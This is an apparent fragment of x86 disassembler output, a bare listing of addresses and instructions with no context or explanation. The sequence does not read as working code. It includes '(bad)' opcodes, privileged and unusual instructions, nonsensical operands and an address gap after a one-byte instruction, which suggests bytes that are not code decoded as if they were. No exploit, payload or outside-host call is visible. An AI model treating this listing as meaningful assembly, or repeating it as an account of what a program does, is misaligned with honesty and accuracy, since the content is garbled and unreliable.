  41137a:	mov    ecx,DWORD PTR [ecx+edx*2]
  41137d:	push   esi
  41137e:	push   esi
  41137f:	(bad)  
  411380:	lock add DWORD PTR [ebp+0x44],eax
  411384:	mov    edx,DWORD PTR [eax]
  411386:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  41138a:	or     BYTE PTR [edi+eax*1+0x51],dl
  41138e:	ret    
  41138f:	xor    ebx,DWORD PTR [ebx+0x37232be]
  411395:	add    BYTE PTR [ecx+0x147c8bfe],cl
  41139b:	or     al,0x80
  41139d:	jge    0x4113a0
  41139f:	mov    DWORD PTR [eax],eax
  4113a1:	and    al,0x8
  4113a3:	cmp    DWORD PTR [ebp+0x10],eax
  4113a6:	mov    edx,DWORD PTR [esi]
  4113a8:	xchg   esp,eax
  4113a9:	dec    esp
  4113aa:	add    BYTE PTR [eax],dl
  4113ac:	mov    ecx,edx
  4113ae:	add    edx,DWORD PTR [esp+edi*1+0x8]
  4113b2:	dec    ebp
  4113b3:	into   
  4113b4:	mov    ebp,DWORD PTR [edi+0x240089d8]
  4113ba:	mov    edx,DWORD PTR [eax+0x14]
  4113bd:	das    
  4113be:	add    al,0x45
  4113c0:	add    BYTE PTR [ebp+0x0],dh
  4113c3:	mov    edi,edi
  4113c5:	and    al,0x50
  4113c7:	mov    eax,DWORD PTR [eax]
  4113c9:	and    al,0xd1
  4113cb:	xor    eax,DWORD PTR [esi]
  4113cd:	lea    eax,[ebp+0x8]
  4113d0:	xor    esi,DWORD PTR [edx+0x3]
  4113d3:	add    BYTE PTR [ecx+0x4510fc44],cl
  4113d9:	xor    ecx,DWORD PTR [ebx+0x75eb0c9c]
  4113df:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  4113e9:	cmp    al,0xff
  4113eb:	pushf  
  4113ec:	mov    edi,edi
  4113ee:	or     BYTE PTR [esi+ecx*1],cl
  4113f1:	jne    0x4113b6
  4113f3:	call   0xa13bf
  4113f8:	adc    BYTE PTR [ebp+eax*2+0xc],al
  4113fc:	mov    ebx,DWORD PTR [eax]
  4113fe:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  411402:	mov    DWORD PTR [edi+ebp*4-0x73],0x750110fc
  41140a:	pop    esi
  41140b:	dec    ecx
  41140d:	and    al,0x10
  41140f:	call   DWORD PTR [ebp+0x24]
  411412:	in     al,dx
  411413:	call   0xffc512fc
  411418:	adc    BYTE PTR [ecx+esi*1+0xc],al
  41141c:	pushf  
  41141d:	pop    esi
  41141e:	mov    ebp,esp
  411420:	and    al,0xc2
  411422:	push   edi
  411423:	add    BYTE PTR [ecx+0x33],al
  411426:	mov    DWORD PTR [ebp+0x24],esi
  411429:	test   DWORD PTR [ebx-0x45f7db8b],ecx
  41142f:	dec    DWORD PTR [eax]
  411431:	and    al,0x7
  411433:	(bad)  
  411434:	cli    
  411435:	and    al,0x9b
  411437:	or     BYTE PTR [edx],dh
  411439:	sbb    BYTE PTR [ebx],al
  41143b:	adc    al,0x89
  41143d:	jmp    DWORD PTR [esp]
  411440:	mov    ecx,DWORD PTR [ebx+0x1c7c0c0c]
  411446:	adc    al,0x8
  411448:	dec    ebp
  411449:	adc    BYTE PTR [ebp-0x7c],dh
  41144c:	mov    esi,DWORD PTR [edx]
  41144e:	and    al,0x24
  411450:	xor    eax,DWORD PTR [ebp-0x63dbf175]
  411456:	add    edi,eax
  411458:	pcmpeqb mm1,mm2
  41145b:	jmp    0x4114a9
  41145d:	dec    DWORD PTR [eax]
  41145f:	je     0x41144c
  411461:	mov    edi,DWORD PTR [ecx]
  411463:	pop    ebp
  411464:	adc    BYTE PTR [esp+ecx*2-0x3e],al
  411468:	fwait
  411469:	mov    DWORD PTR [eax-0x8],ebp
  41146c:	jge    0x4114d6
  41146e:	dec    DWORD PTR [ecx+0x5fbf7424]
